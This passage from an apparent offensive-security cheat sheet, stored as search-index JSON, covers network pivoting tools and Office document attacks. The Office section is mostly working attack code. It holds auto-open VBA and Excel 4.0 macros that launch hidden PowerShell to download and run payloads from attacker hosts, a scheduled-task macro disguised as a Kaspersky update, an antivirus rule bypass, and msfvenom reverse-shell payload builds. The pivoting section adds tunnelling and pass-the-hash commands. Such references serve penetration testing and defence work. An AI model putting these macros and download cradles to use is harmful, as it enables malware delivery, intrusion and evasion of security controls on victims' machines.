pivotnacci","text":"<p>pivotnacci, a tool to make socks connections through HTTP agents.</p> <pre><code>pip3 install pivotnacci\npivotnacci  https://domain.com/agent.php --password \"s3cr3t\"\npivotnacci  https://domain.com/agent.php --polling-interval 2000\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#metasploit","title":"Metasploit","text":"<pre><code># Meterpreter list active port forwards\nportfwd list \n# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell\nportfwd add \u2013l 3389 \u2013p 3389 \u2013r target-host \nportfwd add -l 88 -p 88 -r 127.0.0.1\nportfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445\n# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell\nportfwd delete \u2013l 3389 \u2013p 3389 \u2013r target-host \n# Meterpreter delete all port forwards\nportfwd flush \nor\n# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0\nrun autoroute -s 192.168.15.0/24 \nuse auxiliary/server/socks_proxy\nset SRVPORT 9090\nset VERSION 4a\n# or\nuse auxiliary/server/socks4a     # (deprecated)\n# Meterpreter list all active routes\nrun autoroute -p \nroute #Meterpreter view available networks the compromised host can access\n# Meterpreter add route for 192.168.14.0/24 via Session number.\nroute add 192.168.14.0 255.255.255.0 3 \n# Meterpreter delete route for 192.168.14.0/24 via Session number.\nroute delete 192.168.14.0 255.255.255.0 3 \n# Meterpreter delete all routes\nroute flush \n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#empire","title":"Empire","text":"<pre><code>(Empire) &gt; socksproxyserver\n(Empire) &gt; use module management/invoke_socksproxy\n(Empire) &gt; set remoteHost 10.10.10.10\n(Empire) &gt; run\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#sshuttle","title":"sshuttle","text":"<p>Transparent proxy server that works as a poor man's VPN. Forwards over ssh. </p> <ul> <li>Doesn't require admin. </li> <li>Works with Linux and MacOS.</li> <li>Supports DNS tunneling.</li> </ul> <pre><code>pacman -Sy sshuttle\napt-get install sshuttle\nsshuttle -vvr user@10.10.10.10 10.1.1.0/24\nsshuttle -vvr username@pivot_host 10.2.2.0/24 \n# using a private key\n$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e \"ssh -i ~/.ssh/id_rsa\" \n# -x == exclude some network to not transmit over the tunnel\n# -x x.x.x.x.x/24\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#chisel","title":"chisel","text":"<pre><code>go get -v github.com/jpillora/chisel\n# forward port 389 and 88 to hacker computer\nuser@hacker$ /opt/chisel/chisel server -p 8008 --reverse\nuser@victim$ .\\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 \n# SOCKS\nuser@victim$ .\\chisel.exe client YOUR_IP:8008 R:socks\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#sharpchisel","title":"SharpChisel","text":"<p>A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel</p> <pre><code>user@hacker$ ./chisel server -p 8080 --key \"private\" --auth \"user:pass\" --reverse --proxy \"https://www.google.com\"\n================================================================\nserver : run the Server Component of chisel \n-p 8080 : run server on port 8080\n--key \"private\": use \"private\" string to seed the generation of a ECDSA public and private key pair\n--auth \"user:pass\" : Creds required to connect to the server\n--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.\n--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.\nuser@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#ligolo","title":"Ligolo","text":"<p>Ligolo : Reverse Tunneling made easy for pentesters, by pentesters</p> <ol> <li>Build Ligolo   <pre><code># Get Ligolo and dependencies\ncd `go env GOPATH`/src\ngit clone https://github.com/sysdream/ligolo\ncd ligolo\nmake dep\n# Generate self-signed TLS certificates (will be placed in the certs folder)\nmake certs TLS_HOST=example.com\nmake build-all\n</code></pre></li> <li>Use Ligolo   <pre><code># On your attack server.\n./bin/localrelay_linux_amd64\n# On the compromise host.\nligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555\n</code></pre></li> </ol>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#gost","title":"Gost","text":"<p>Wiki English : https://docs.ginuerzh.xyz/gost/en/</p> <pre><code>git clone https://github.com/ginuerzh/gost\ncd gost/cmd/gost\ngo build\n# Socks5 Proxy\nServer side: gost -L=socks5://:1080\nClient side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true\n# Local Port Forward\ngost -L=tcp://:2222/192.168.1.1:22 [-F=..]\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#rpivot","title":"Rpivot","text":"<p>Server (Attacker box)</p> <pre><code>python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0\n</code></pre> <p>Client (Compromised box)</p> <pre><code>python client.py --server-ip &lt;ip&gt; --server-port 9443\n</code></pre> <p>Through corporate proxy</p> <pre><code>python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\\n--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e\n</code></pre> <p>Passing the hash</p> <pre><code>python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\\n--ntlm-proxy-port 8080 --domain CORP --username jdoe \\\n--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#revsocks","title":"revsocks","text":"<pre><code># Listen on the server and create a SOCKS 5 proxy on port 1080\nuser@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234\n# Connect client to the server\nuser@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234\nuser@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent \"Mozilla 5.0/IE Windows 10\"\n</code></pre> <pre><code># Build for Linux\ngit clone https://github.com/kost/revsocks\nexport GOPATH=~/go\ngo get github.com/hashicorp/yamux\ngo get github.com/armon/go-socks5\ngo get github.com/kost/go-ntlmssp\ngo build\ngo build -ldflags=\"-s -w\" &amp;&amp; upx --brute revsocks\n# Build for Windows\ngo get github.com/hashicorp/yamux\ngo get github.com/armon/go-socks5\ngo get github.com/kost/go-ntlmssp\nGOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\"\ngo build -ldflags -H=windowsgui\nupx revsocks\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#plink","title":"plink","text":"<pre><code># exposes the SMB port of the machine in the port 445 of the SSH Server\nplink -l root -pw toor -R 445:127.0.0.1:445 \n# exposes the RDP port of the machine in the port 3390 of the SSH Server\nplink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  \nplink -l root -pw mypassword 192.168.18.84 -R\nplink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445\nplink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]\n# redirects the Windows port 445 to Kali on port 22\nplink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   \n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#ngrok","title":"ngrok","text":"<pre><code># get the binary\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\nunzip ngrok-stable-linux-amd64.zip \n# log into the service\n./ngrok authtoken 3U[REDACTED_TOKEN]Hm\n# deploy a port forwarding for 4433\n./ngrok http 4433\n./ngrok tcp 4433\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#cloudflared","title":"cloudflared","text":"<pre><code># Get the binary\nwget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz\ntar xvzf cloudflared-stable-linux-amd64.tgz\n# Expose accessible internal service to the internet\n./cloudflared tunnel --url &lt;protocol&gt;://&lt;host&gt;:&lt;port&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#capture-a-network-trace-with-builtin-tools","title":"Capture a network trace with builtin tools","text":"<ul> <li>Windows (netsh)   <pre><code># start a capture use the netsh command.\nnetsh trace start capture=yes report=disabled tracefile=c:\\trace.etl maxsize=16384\n# stop the trace\nnetsh trace stop\n# Event tracing can be also used across a reboots\nnetsh trace start capture=yes report=disabled persistent=yes tracefile=c:\\trace.etl maxsize=16384\n# To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.\netl2pcapng.exe c:\\trace.etl c:\\trace.pcapng\n# Use filters\nnetsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\\trace.etl maxsize=16384\n</code></pre></li> <li>Linux (tcpdump)   <pre><code>sudo apt-get install tcpdump\ntcpdump -w 0001.pcap -i eth0\ntcpdump -A -i eth0\n# capture every TCP packet\ntcpdump -i eth0 tcp\n# capture everything on port 22\ntcpdump -i eth0 port 22\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#basic-pivoting-types","title":"Basic Pivoting Types","text":"Type Use Case Listen - Listen Exposed asset, may not want to connect out. Listen - Connect Normal redirect. Connect - Connect Can\u2019t bind, so connect to bridge two hosts"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#listen-listen","title":"Listen - Listen","text":"Type Use Case ncat <code>ncat -v -l -p 8080 -c \"ncat -v -l -p 9090\"</code> socat <code>socat -v tcp-listen:8080 tcp-listen:9090</code> remote host 1 <code>ncat localhost 8080 &lt; file</code> remote host 2 <code>ncat localhost 9090 &gt; newfile</code>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#listen-connect","title":"Listen - Connect","text":"Type Use Case ncat <code>ncat -l -v -p 8080 -c \"ncat localhost 9090\"</code> socat <code>socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090</code> remote host 1 <code>ncat localhost -p 8080 &lt; file</code> remote host 2 <code>ncat -l -p 9090 &gt; newfile</code>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#connect-connect","title":"Connect - Connect","text":"Type Use Case ncat <code>ncat localhost 8080 -c \"ncat localhost 9090\"</code> socat <code>socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090</code> remote host 1 <code>ncat -l -p 8080 &lt; file</code> remote host 2 <code>ncat -l -p 9090 &gt; newfile</code>"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#references","title":"References","text":"<ul> <li>Port Forwarding in Windows - Windows OS Hub</li> <li>Using the SSH \"Konami Code\" (SSH Control Sequences) - Jeff McJunkin</li> <li>A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko</li> <li>Pivoting Meterpreter</li> <li>\ud83c\uddeb\ud83c\uddf7 Etat de l\u2019art du pivoting r\u00e9seau en 2019 - Oct 28,2019 - Alexandre ZANNI - \ud83c\uddfa\ud83c\uddf8 Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI</li> <li>Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8</li> <li>Active Directory - hideandsec</li> <li>Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert</li> </ul>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/","title":"Office - Attacks","text":""},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#summary","title":"Summary","text":"<ul> <li>Office Products Features</li> <li>Office Default Passwords</li> <li>Excel<ul> <li>XLSM - Hot Manchego</li> <li>XLS - Macrome</li> <li>XLM Excel 4.0 - SharpShooter</li> <li>XLM Excel 4.0 - EXCELntDonut</li> <li>XLM Excel 4.0 - EXEC</li> <li>SLK - EXEC</li> </ul> </li> <li>Word<ul> <li>DOCM - Metasploit</li> <li>DOCM - Download and Execute</li> <li>DOCM - Macro Creator</li> <li>DOCM - C# converted to Office VBA macro</li> <li>DOCM - VBA Wscript</li> <li>DOCM - VBA Shell Execute Comment</li> <li>DOCM - VBA Spawning via svchost.exe using Scheduled Task</li> <li>DCOM - WMI COM functions (VBA AMSI)</li> <li>DOCM - winmgmts</li> <li>DOCM - Macro Pack - Macro and DDE</li> <li>DOCM - BadAssMacros</li> <li>DOCM - CACTUSTORCH VBA Module</li> <li>DOCM - MMG with Custom DL + Exec</li> <li>VBA Obfuscation</li> <li>VBA Purging<ul> <li>OfficePurge</li> <li>EvilClippy</li> </ul> </li> <li>VBA AMSI</li> <li>VBA - Offensive Security Template</li> <li>DOCX - Template Injection</li> <li>DOCX - DDE</li> </ul> </li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#office-products-features","title":"Office Products Features","text":""},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#office-default-passwords","title":"Office Default Passwords","text":"<p>By default, Excel does not set a password when saving a new file. However, some older versions of Excel had a default password that was used if the user did not set a password themselves. The default password was \"<code>VelvetSweatshop</code>\", and it could be used to open any file that did not have a password set.</p> <p>If the user has not supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified in section 2.3 MUST be the following password: \"<code>\\x2f\\x30\\x31\\x48\\x61\\x6e\\x6e\\x65\\x73\\x20\\x52\\x75\\x65\\x73\\x63\\x68\\x65\\x72\\x2f\\x30\\x31</code>\". - 2.4.2.3 Binary Document Write Protection Method 3</p> Product Password Supported Formats Excel VelvetSweatshop all Excel formats PowerPoint 01Hannes Ruescher/01 .pps .ppt"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlsm-hot-manchego","title":"XLSM - Hot Manchego","text":"<p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine.</p> <ul> <li>https://github.com/FortyNorthSecurity/hot-manchego</li> </ul> <pre><code>Generate CS Macro and save it to Windows as vba.txt\nPS&gt; New-Item blank.xlsm\nPS&gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs\nPS&gt; .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-macrome","title":"XLM - Macrome","text":"<p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p> <ul> <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</li> <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</li> <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</li> </ul> <pre><code># NOTE: The payload cannot contains NULL bytes.\n# Default calc\nmsfvenom -a x86 -b '\\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin\nmsfvenom -a x64 -b '\\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin\n# Custom shellcode\nmsfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\\x00'\nmsfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\\x00'\n# MSF shellcode\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin\nmsfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin\ndotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin\ndotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin\n# For VBA Macro\nMacrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop\n</code></pre> <p>When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-excel-40-sharpshooter","title":"XLM Excel 4.0 - SharpShooter","text":"<ul> <li>https://github.com/mdsecactivebreach/SharpShooter</li> </ul> <pre><code># Options\n-rawscfile &lt;path&gt;  Path to raw shellcode file for stageless payloads\n--scfile &lt;path&gt;    Path to shellcode file as CSharp byte array\npython SharpShooter.py --payload slk --rawscfile shellcode.bin --output test\n# Creation of a VBA Macro\n# creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.\nSharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl\n# Creation of an Excel 4.0 SLK Macro Enabled Document\n~# /!\\ The shellcode cannot contain null bytes\nmsfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\\x00'\nSharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee\nmsfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\\x00'\nSharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-excel-40-excelntdonut","title":"XLM Excel 4.0 - EXCELntDonut","text":"<ul> <li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li> <li>AMSI has no visibility into XLM macros (for now)</li> <li>Anti-virus struggles with XLM (for now)</li> <li> <p>XLM macros can access the Win32 API (virtualalloc, createthread, ...)</p> </li> <li> <p>Open an Excel Workbook.</p> </li> <li>Right click on \"Sheet 1\" and click \"Insert...\". Select \"MS Excel 4.0 Macro\".</li> <li>Open your EXCELntDonut output file in a text editor and copy everything.</li> <li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li> <li>At this point, everything is in column A. To fix that, we'll use the \"Text-to-Columns\"/\"Convert\" tool under the \"Data\" tab.</li> <li>Highlight column A and open the \"Text-to-Columns\"  tool. Select \"Delimited\" and then \"Semicolon\" on the next screen. Select \"Finished\".</li> <li>Right-click on cell A1* and select \"Run\". This will execute your payload to make sure it works.</li> <li>To enable auto-execution, we need to rename cell A1 to \"Auto_Open\". You can do this by clicking into cell A1 and then clicking into the box that says \"A1\" just above Column A. Change the text from \"A1\"* to \"Auto_Open\". Save the file and verify that auto-execution works.</li> </ul> <p> If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1</p> <pre><code>git clone https://github.com/FortyNorthSecurity/EXCELntDonut\n-f path to file containing your C# source code (exe or dll)\n-c ClassName where method that you want to call lives (dll)\n-m Method containing your executable payload (dll)\n-r References needed to compile your C# code (ex: -r 'System.Management')\n-o output filename\n--sandbox Perform basic sandbox checks. \n--obfuscate Perform basic macro obfuscation. \n# Fork\ngit clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs\ndonut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe\ndonut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe\nusage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]\npython3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin\n</code></pre> <p>XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</p>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-excel-40-exec","title":"XLM Excel 4.0 - EXEC","text":"<ol> <li>Right Click to the current sheet</li> <li>Insert a Macro IntL MS Excel 4.0</li> <li>Add the <code>EXEC</code> macro     <pre><code>=EXEC(\"poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')\")\n=halt()\n</code></pre></li> <li>Rename cell to Auto_open</li> <li>Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide</li> </ol>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#slk-exec","title":"SLK - EXEC","text":"<pre><code>ID;P\nO;E\nNN;NAuto_open;ER101C1;KOut Flank;F\nC;X1;Y101;K0;EEXEC(\"c:\\shell.cmd\")\nC;X1;Y102;K0;EHALT()\nE\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-metasploit","title":"DOCM - Metasploit","text":"<pre><code>use exploit/multi/fileformat/office_word_macro\nset payload windows/meterpreter/reverse_http\nset LHOST 10.10.10.10\nset LPORT 80\nset DisablePayloadHandler True\nset PrependMigrate True\nset FILENAME Financial2021.docm\nexploit -j\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-download-and-execute","title":"DOCM - Download and Execute","text":"<p>Detected by Defender (AMSI)</p> <pre><code>Sub Execute()\nDim payload\npayload = \"powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');\"\nCall Shell(payload, vbHide)\nEnd Sub\nSub Document_Open()\nExecute\nEnd Sub\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-macro-creator","title":"DOCM - Macro Creator","text":"<ul> <li>https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</li> </ul> <pre><code># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:\nC:\\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body\n# Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:\nC:\\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o\n# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:\nC:\\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-c-converted-to-office-vba-macro","title":"DOCM - C# converted to Office VBA macro","text":"<p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p> <p>https://github.com/trustedsec/unicorn</p> <pre><code>python unicorn.py payload.cs cs macro\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-vba-wscript","title":"DOCM - VBA Wscript","text":"<p>https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</p> <pre><code>Sub parent_change()\nDim objOL\nSet objOL = CreateObject(\"Outlook.Application\")\nSet shellObj = objOL.CreateObject(\"Wscript.Shell\")\nshellObj.Run(\"notepad.exe\")\nEnd Sub\nSub AutoOpen()\nparent_change\nEnd Sub\nSub Auto_Open()\nparent_change\nEnd Sub\n</code></pre> <pre><code>CreateObject(\"WScript.Shell\").Run \"calc.exe\"\nCreateObject(\"WScript.Shell\").Exec \"notepad.exe\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-vba-shell-execute-comment","title":"DOCM - VBA Shell Execute Comment","text":"<p>Set your command payload inside the Comment metadata of the document.</p> <pre><code>Sub beautifulcomment()\n    Dim p As DocumentProperty\n    For Each p In ActiveDocument.BuiltInDocumentProperties\n        If p.Name = \"Comments\" Then\n            Shell (p.Value)\n        End If\n    Next\nEnd Sub\n\nSub AutoExec()\n    beautifulcomment\nEnd Sub\n\nSub AutoOpen()\n    beautifulcomment\nEnd Sub\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-vba-spawning-via-svchostexe-using-scheduled-task","title":"DOCM - VBA Spawning via svchost.exe using Scheduled Task","text":"<pre><code>Sub AutoOpen()\nSet service = CreateObject(\"Schedule.Service\")\nCall service.Connect\nDim td: Set td = service.NewTask(0)\ntd.RegistrationInfo.Author = \"Kaspersky Corporation\"\ntd.settings.StartWhenAvailable = True\ntd.settings.Hidden = False\nDim triggers: Set triggers = td.triggers\nDim trigger: Set trigger = triggers.Create(1)\nDim startTime: ts = DateAdd(\"s\", 30, Now)\nstartTime = Year(ts) &amp; \"-\" &amp; Right(Month(ts), 2) &amp; \"-\" &amp; Right(Day(ts), 2) &amp; \"T\" &amp; Right(Hour(ts), 2) &amp; \":\" &amp; Right(Minute(ts), 2) &amp; \":\" &amp; Right(Second(ts), 2)\ntrigger.StartBoundary = startTime\ntrigger.ID = \"TimeTriggerId\"\nDim Action: Set Action = td.Actions.Create(0)\nAction.Path = \"C:\\Windows\\System32\\powershell.exe\"\nAction.Arguments = \"-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"\nCall service.GetFolder(\"\\\").RegisterTaskDefinition(\"AVUpdateTask\", td, 6, , , 3)\nEnd Sub\nRem powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-wmi-com-functions","title":"DOCM - WMI COM functions","text":"<p>Basic WMI exec (detected by Defender) : <code>r = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").Create(\"calc.exe\", null, null, intProcessID)</code></p> <pre><code>Sub wmi_exec()\nstrComputer = \".\"\nSet objWMIService = GetObject(\"winmgmts:\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")\nSet objStartUp = objWMIService.Get(\"Win32_ProcessStartup\")\nSet objProc = objWMIService.Get(\"Win32_Process\")\nSet procStartConfig = objStartUp.SpawnInstance_\nprocStartConfig.ShowWindow = 1\nobjProc.Create \"powershell.exe\", Null, procStartConfig, intProcessID\nEnd Sub\n</code></pre> <ul> <li>https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</li> <li>https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</li> </ul> <pre><code>Sub ASR_bypass_create_child_process_rule5()\nConst HIDDEN_WINDOW = 0\nstrComputer = \".\"\nSet objWMIService = GetObject(\"win\" &amp; \"mgmts\" &amp; \":\\\\\" &amp; strComputer &amp; \"\\root\" &amp; \"\\cimv2\")\nSet objStartup = objWMIService.Get(\"Win32_\" &amp; \"Process\" &amp; \"Startup\")\nSet objConfig = objStartup.SpawnInstance_\nobjConfig.ShowWindow = HIDDEN_WINDOW\nSet objProcess = GetObject(\"winmgmts:\\\\\" &amp; strComputer &amp; \"\\root\" &amp; \"\\cimv2\" &amp; \":Win32_\" &amp; \"Process\")\nobjProcess.Create \"cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')\", Null, objConfig, intProcessID\nEnd Sub\nSub AutoExec()\nASR_bypass_create_child_process_rule5\nEnd Sub\nSub AutoOpen()\nASR_bypass_create_child_process_rule5\nEnd Sub\n</code></pre> <pre><code>Const ShellWindows = \"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\"\nSet SW = GetObject(\"new:\" &amp; ShellWindows).Item()\nSW.Document.Application.ShellExecute \"cmd.exe\", \"/c powershell.exe\", \"C:\\Windows\\System32\", Null, 0\n</code></pre>"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docmxlm-macro-pack-macro-and-dde","title":"DOCM/XLM - Macro Pack - Macro and DDE","text":"<p>Only the community version is available online.</p> <ul> <li>https://github.com/sevagas/macro_pack</li> </ul> <pre><code># Options\n-G, --generate=OUTPUT_FILE_PATH. Generates a file. \n-t, --template=TEMPLATE_NAME    Use code template already included in MacroPack\n-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)\n# Execute a command\necho \"calc.exe\" | macro_pack.exe -t CMD -G cmd.xsl\n# Download and execute a file\necho &lt;file_to_drop_url&gt; \"&lt;download_path&gt;\" | macro_pack.exe -t DROPPER -o -G dropper.xls\n# Meterpreter reverse TCP template using MacroMeter by Cn33liz\necho &lt;ip&gt; 